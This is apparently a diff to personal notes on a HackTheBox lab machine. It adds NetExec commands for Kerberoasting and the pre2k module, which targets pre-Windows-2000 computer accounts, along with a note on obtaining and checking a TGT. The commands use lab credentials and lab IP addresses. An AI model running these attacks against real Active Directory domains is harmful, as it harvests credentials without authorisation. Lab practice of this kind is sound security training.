@@ -21,6 +21,14 @@ ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
 ```shell
 nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
 ```
-
 ![](Pasted%20image%2020260616092929.png)
 
+# pre2k
+```shell
+nxc ldap 10.129.4.198 -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
+```
+![](Pasted%20image%2020260616184912.png)
+
+## klist
+get TGT and validation with klist
+![](Pasted%20image%2020260616204625.png)
